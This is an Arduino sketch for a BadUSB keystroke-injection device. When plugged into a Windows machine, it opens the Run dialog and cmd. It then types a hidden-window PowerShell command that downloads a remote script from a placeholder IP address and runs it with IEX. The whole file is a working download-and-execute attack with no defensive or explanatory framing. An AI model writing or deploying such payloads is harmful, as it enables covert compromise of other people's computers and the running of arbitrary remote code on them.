void setup() {
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.print("powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://xx.xx.xx.xx/yuanshen.ps1');");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2500);
}

void loop() {}
